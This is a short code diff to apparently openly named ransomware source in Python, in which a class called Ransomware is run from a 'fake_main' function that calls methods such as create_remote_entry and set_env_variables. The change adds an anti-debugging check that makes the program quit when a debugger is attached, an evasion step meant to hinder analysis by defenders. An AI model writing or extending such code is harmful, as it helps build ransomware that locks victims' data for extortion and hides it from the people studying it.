@@ -266,6 +266,8 @@ class Ransomware:
 
 
 def fake_main():
+    if ctypes.windll.kernel32.IsDebuggerPresent():
+        return
     rnsm = Ransomware()
     rnsm.create_remote_entry()
     rnsm.set_env_variables()
@@ -301,6 +303,6 @@ class Threading(object):
 
 
 if __name__ == "__main__":
-    tr = Threading()
+    Threading()
     main()
 
